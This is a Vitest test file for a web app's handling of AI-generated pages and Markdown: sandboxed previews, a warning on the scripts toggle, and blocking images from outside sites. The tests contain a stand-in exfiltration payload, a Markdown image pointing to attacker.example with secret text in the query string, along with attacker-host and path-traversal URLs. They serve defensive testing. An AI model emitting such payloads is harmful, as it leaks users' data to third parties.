/**
 * Generated content shown inside the app (SEC-4): what a preview may do before anyone clicks. Rendered to HTML with
 * react-dom/server; the browser-side behaviour (no request leaves) is the sandbox's and the CSP's.
 */
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { ArtifactPreview } from '../src/components/ArtifactPreview.tsx';
import { Markdown } from '../src/components/Markdown.tsx';
import { ScaledPage } from '../src/components/ScaledPage.tsx';
import { ScriptsToggle } from '../src/components/ScriptsToggle.tsx';
import { PageResult } from '../src/components/result/PageResult.tsx';
import { createViewerFlag, type FlagStorage } from '../src/components/viewerFlags.ts';
import { FIRST_SCREEN_ONLY, frameSandbox, isOwnArtifactUrl } from '../src/view/pages.ts';
import { filesUnder, REPO } from './guards/scan.ts';

const ID = `sha256:${'b'.repeat(64)}`;
const WEB = path.join(REPO, 'apps', 'web');
const html = (el: Parameters<typeof renderToStaticMarkup>[0]) => renderToStaticMarkup(el);

describe('generated pages in the app', () => {
  it('run no scripts unless the person turned them on: a page could otherwise navigate itself and carry data out', () => {
    expect(frameSandbox(false)).toBe('');
    expect(frameSandbox(true)).toBe('allow-scripts');
    expect(html(createElement(ScaledPage, { id: ID, title: 'Draft A' }))).toContain('sandbox=""');
    expect(html(createElement(ScaledPage, { id: ID, title: 'Draft A', scripts: true }))).toContain('sandbox="allow-scripts"');
    // Never same-origin, scripts or not.
    expect(html(createElement(ScaledPage, { id: ID, title: 'Draft A', scripts: true }))).not.toContain('allow-same-origin');
  });

  it('show thumbnails as pictures with scripts off, and the finished page with scripts off until asked', () => {
    const thumb = html(createElement(ArtifactPreview, { id: ID, info: { mediaType: 'text/html' }, title: 'Draft A', size: 'thumb' }));
    expect(thumb).toContain('sandbox=""');
    const result = html(createElement(PageResult, { id: ID, title: 'My page' }));
    expect(result).toContain('sandbox=""');
    expect(result).toMatch(/aria-pressed="false"[^>]*>[^<]*Run the page’s scripts/);
    const large = html(createElement(ArtifactPreview, { id: ID, info: { mediaType: 'text/html' }, title: 'Draft A', size: 'large' }));
    expect(large).toContain('sandbox=""');
    expect(large).toMatch(/aria-pressed="false"[^>]*>[^<]*Run the page’s scripts/);
  });
});

describe('a large page preview in a view people decide in (F13)', () => {
  it('is a picture of the first screen named for assistive technology, and says it is only that; a thumbnail stays a decoration', () => {
    const large = html(createElement(ArtifactPreview, { id: ID, info: { mediaType: 'text/html' }, title: 'Draft A', size: 'large' }));
    expect(large).toMatch(/<div class="scaled"[^>]*role="img" aria-label="Draft A: the first screen of the page"/);
    // The frame inside is the picture's content, out of the Tab order and hidden from assistive technology as before.
    expect(large).toMatch(/<iframe[^>]*tabindex="-1"[^>]*aria-hidden="true"/i);
    expect(large).toContain(FIRST_SCREEN_ONLY);
    // The same, with the switch held by the caller (compare).
    const held = html(createElement(ArtifactPreview, { id: ID, info: { mediaType: 'text/html' }, title: 'Before', size: 'large', scripts: false }));
    expect(held).toContain('aria-label="Before: the first screen of the page"');
    expect(held).toContain(FIRST_SCREEN_ONLY);
    const thumb = html(createElement(ArtifactPreview, { id: ID, info: { mediaType: 'text/html' }, title: 'Draft A', size: 'thumb' }));
    expect(thumb).not.toContain('role="img"');
    expect(thumb).not.toContain(FIRST_SCREEN_ONLY);
    // A live preview can be scrolled and used: no picture name, and no first-screen note.
    const live = html(createElement(ArtifactPreview, { id: ID, info: { mediaType: 'text/html' }, title: 'Draft A', size: 'large', interactive: true }));
    expect(live).not.toContain('role="img"');
    expect(live).not.toContain(FIRST_SCREEN_ONLY);
  });
});

describe('running a generated page’s scripts (SEC-4)', () => {
  const SHIPPED = /\.(ts|tsx)$/;
  const shipped = () => [...filesUnder(path.join(WEB, 'src'), SHIPPED), ...filesUnder(path.join(WEB, 'app'), SHIPPED)];

  it('is never a remembered switch: no stored flag is about scripts, and nothing writes one to browser storage', () => {
    const files = shipped();
    const flagKeys = files.flatMap((f) => [...readFileSync(f, 'utf8').matchAll(/createViewerFlag\(\s*['"]([^'"]+)['"]/g)].map((m) => m[1] as string));
    // The scan finds the switches that are remembered (single-key shortcuts), so an empty list proves nothing.
    expect(flagKeys.length).toBeGreaterThan(0);
    expect(flagKeys.filter((k) => /script/i.test(k))).toEqual([]);
    for (const f of files) expect(/(?:localStorage|sessionStorage)\.setItem\([^)]*script/i.test(readFileSync(f, 'utf8')), f).toBe(false);
  });

  it('says plainly, on or off, that a page running its scripts can send what it contains to other sites', () => {
    for (const on of [false, true]) {
      const out = html(createElement(ScriptsToggle, { on, onChange: () => undefined }));
      expect(out).toContain(`aria-pressed="${on}"`);
      expect(out).toContain('A page running its scripts can send what it contains to other sites.');
    }
    // On, it says how long: only while this screen shows the page.
    expect(html(createElement(ScriptsToggle, { on: true, onChange: () => undefined }))).toContain('until you leave or reload this screen');
    expect(html(createElement(ScriptsToggle, { on: false, onChange: () => undefined, label: 'Run the pages’ scripts' }))).toContain('Run the pages’ scripts');
  });
});

describe('Markdown from models', () => {
  it('shows byway’s own generated images, and never fetches an image from another site', () => {
    const own = html(createElement(Markdown, { text: `![Cyclists at dawn](/api/artifacts/${ID})` }));
    expect(own).toContain(`<img src="/api/artifacts/${ID}" alt="Cyclists at dawn"`);
    const outside = html(createElement(Markdown, { text: '![chart](https://attacker.example/p.png?d=SECRET-PROBLEM-TEXT-42)' }));
    expect(outside).not.toContain('<img');
    expect(outside).toContain('chart');
    expect(outside).toContain('not loaded');
    expect(outside).not.toContain('SECRET-PROBLEM-TEXT-42');
  });

  it('recognises only same-origin artifact addresses', () => {
    expect(isOwnArtifactUrl(`/api/artifacts/${ID}`)).toBe(true);
    expect(isOwnArtifactUrl(`/artifacts/${encodeURIComponent(ID)}`)).toBe(true);
    expect(isOwnArtifactUrl(`//attacker.example/artifacts/${ID}`)).toBe(false);
    expect(isOwnArtifactUrl(`https://attacker.example/api/artifacts/${ID}`)).toBe(false);
    expect(isOwnArtifactUrl(`/api/artifacts/${ID}/../../settings`)).toBe(false);
    expect(isOwnArtifactUrl(undefined)).toBe(false);
  });
});

describe('per-viewer switches', () => {
  function memory(): FlagStorage & { data: Map<string, string> } {
    const data = new Map<string, string>();
    return { data, getItem: (k) => data.get(k) ?? null, setItem: (k, v) => void data.set(k, v) };
  }

  it('remember a choice in this browser, and fall back to the default when storage is missing or refuses', () => {
    const store = memory();
    const flag = createViewerFlag('byway.test', false, () => store);
    expect(flag.get()).toBe(false);
    flag.set(true);
    expect(flag.get()).toBe(true);
    expect(store.data.get('byway.test')).toBe('1');
    const broken = createViewerFlag('byway.test', true, () => {
      throw new Error('blocked');
    });
    expect(broken.get()).toBe(true);
    broken.set(false);
    expect(broken.get()).toBe(false);
  });
});
